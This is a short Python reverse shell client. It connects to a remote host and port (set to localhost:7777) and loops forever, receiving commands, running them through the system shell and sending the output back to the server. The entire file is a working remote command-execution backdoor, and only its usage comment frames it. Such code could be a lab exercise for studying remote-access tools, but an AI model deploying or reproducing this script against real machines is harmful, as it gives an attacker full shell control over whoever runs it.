# Run client.py after intiating corresponding server.py so that the connection request initiatied by client is accepted.


import socket
import subprocess

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 7777
client = socket.socket()

print ("[-] Connection Initiating ...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print ("[-] Connection Initiated!")

while True:
    print ("[-] Awaiting command...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output=op.stdout.read()
    output_error = op.stderr.read()
    
    print("[-] Sending response...")
    client.send(output + output_error)
    
    

